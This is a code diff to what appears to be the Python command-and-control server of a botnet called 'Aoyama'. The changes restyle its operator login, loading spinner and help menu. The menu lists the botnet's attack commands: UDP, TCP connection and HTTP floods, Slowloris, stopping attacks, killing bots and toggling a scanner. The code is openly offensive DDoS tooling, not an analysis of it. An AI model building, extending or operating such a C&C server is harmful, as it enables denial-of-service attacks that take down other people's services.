@@ -167,9 +167,9 @@ def Verify(sock,addr,rlock):
 
 def Commander(sock,rlock):#cnc server
 	try:
-		sock.send("Username:".encode())
+		sock.send("\033[36;1m[+] Username: ".encode())
 		name = ReadSocket(sock,1024)
-		sock.send("Password:".encode())
+		sock.send("\033[36;1m[+] Password: ".encode())
 		passwd = ReadSocket(sock,1024)
 	except:
 		print("// Someone try to break the server down in progress //")
@@ -186,44 +186,53 @@ def Commander(sock,rlock):#cnc server
 	if corret != 1:
 		sock.close()
 		return
-	sock.send("\033[36;1mSetting up the server\r\n".encode())#loading sense
+	sock.send("\033[36;1m[!] Login Correct.\r\n".encode())
+	sock.send("\033[36;1m[!] Type Help To See Commands.\r\n".encode())
+	time.sleep(1.5)
+	sock.send("\033[2J\033[1H".encode())
+	sock.send("Setting up the server\r\n".encode())
 	time.sleep(0.5)
 	sock.send("\033[2J\033[1H".encode())
 	sock.send("Setting up the server [-]\r\n".encode())
-	time.sleep(0.3)
+	time.sleep(0.15)
 	sock.send("\033[2J\033[1H".encode())
 	sock.send("Setting up the server [\\]\r\n".encode())
-	time.sleep(0.3)
+	time.sleep(0.15)
 	sock.send("\033[2J\033[1H".encode())
 	sock.send("Setting up the server [-]\r\n".encode())
-	time.sleep(0.3)
+	time.sleep(0.15)
 	sock.send("\033[2J\033[1H".encode())
 	sock.send("Setting up the server [/]\r\n".encode())
-	time.sleep(0.3)
+	time.sleep(0.15)
 	sock.send("\033[2J\033[1H".encode())
 	sock.send("Setting up the server [-]\r\n".encode())
-	time.sleep(0.3)
+	time.sleep(0.15)
 	sock.send("\033[2J\033[1H".encode())
 	sock.send("Setting up the server [\\]\r\n".encode())
-	time.sleep(0.3)
+	time.sleep(0.15)
 	sock.send("\033[2J\033[1H".encode())
 	sock.send("Setting up the server [-]\r\n".encode())
-	time.sleep(0.3)
+	time.sleep(0.15)
 	sock.send("\033[2J\033[1H".encode())
 	sock.send("Setting up the server [/]\r\n".encode())
-	time.sleep(0.3)
+	time.sleep(0.15)
+	sock.send("Done!\r\n".encode())
+	time.sleep(0.50)
 	sock.send("\033[2J\033[1H".encode())
+	time.sleep(0.50)
 	sock.send("[!] Setting Up Connection Socket...\r\n".encode())
 	time.sleep(0.5)
 	sock.send("[!] Updating Server Config...\r\n".encode())
 	time.sleep(0.5)
 	sock.send("[!] Setting Up C&C Module...\r\n".encode())
 	time.sleep(0.5)
-	sock.send("[!] Done...\r\n".encode())
-	time.sleep(0.5)
+	sock.send("[!] Done!\r\n".encode())
+	time.sleep(1.5)
+	sock.send("\033[2J\033[1H".encode())
 	sock.send(("[!] Welcome to the Aoyama C&C Server, "+str(name.strip("\r\n"))+"\r\n").encode())
+	sock.send("[!] Type Help To See Commands.\r\n".encode())
 	sock.send("==============================================\r\n".encode())
-	time.sleep(1)
+	time.sleep(0.5)
 	threading.Thread(target=ShowBot,args=(sock,),daemon=True).start()
 
 
@@ -240,20 +249,23 @@ def Commander(sock,rlock):#cnc server
 			#if cmd_str == 'shell' or cmd_str == 'shell\r\n': haven't finished
 				#shell_exec()
 			if cmd_str == '?' or cmd_str == 'help':
-				sock.send('\r\n#-- Commands --#\r\n'.encode())
-				sock.send('  UDP  Flood: !udp  host port threads size\r\n'.encode())#udp flood
-				sock.send('  CC   Flood: !cc   host port threads\r\n'.encode())         #tcp connection flood
-				sock.send('  HTTP Flood: !http host port threads path\r\n'.encode())	#http flood
-				sock.send('  Slowloris : !slow host port threads conn path\r\n\r\n'.encode())    #slowloris
-				sock.send('    !stop    : stop attack\r\n'.encode())
-				sock.send('    !kill    : kill all the bots\r\n'.encode())
-				sock.send('    !scan 1/0: enable/disable scanner\r\n'.encode())
-				sock.send('    bots     : count bot\r\n'.encode())
-				sock.send('    scan     : check online connection\r\n'.encode())#check connecton status, if some offline or timeout will delete them form bot list.
-				sock.send('    clear    : Clear screen\r\n'.encode())
-				sock.send('    exit     : exit the server\r\n'.encode())
-				sock.send('    shutdown : shutdown the server\r\n'.encode())
-				sock.send('=============================================================\r\n'.encode())
+				sock.send('\r\n╔════════════════════════════════════════════════════╗\r\n'.encode())
+				sock.send('║                     Commands                       ║\r\n'.encode())
+				sock.send('║════════════════════════════════════════════════════║\r\n'.encode())
+				sock.send('║  UDP  Flood : !udp host port threads size          ║\r\n'.encode())#udp flood
+				sock.send('║  CC   Flood : !cc host port threads                ║\r\n'.encode())         #tcp connection flood
+				sock.send('║  HTTP Flood : !http host port threads path         ║\r\n'.encode())	#http flood
+				sock.send('║  Slowloris  : !slow host port threads conn path    ║\r\n'.encode())    #slowloris
+				sock.send('║════════════════════════════════════════════════════║\r\n'.encode())
+				sock.send('║  !stop      : Stop attack                          ║\r\n'.encode())
+				sock.send('║  !kill      : Kill all the bots                    ║\r\n'.encode())
+				sock.send('║  !scan 1/0  : Enable/disable scanner               ║\r\n'.encode())
+				sock.send('║   bots      : Count bot                            ║\r\n'.encode())
+				sock.send('║   scan      : Check online connection              ║\r\n'.encode())#check connecton status, if some offline or timeout will delete them form bot list.
+				sock.send('║   clear     : Clear screen                         ║\r\n'.encode())
+				sock.send('║   exit      : Exit the server                      ║\r\n'.encode())
+				sock.send('║   shutdown  : Shutdown the server                  ║\r\n'.encode())
+				sock.send('╚════════════════════════════════════════════════════╝\r\n\r\n'.encode())
 			if cmd_str == 'bots':
 				sock.send(("Nodes:"+str(len(socketList))+"\r\n").encode())
 			if cmd_str == 'clear':
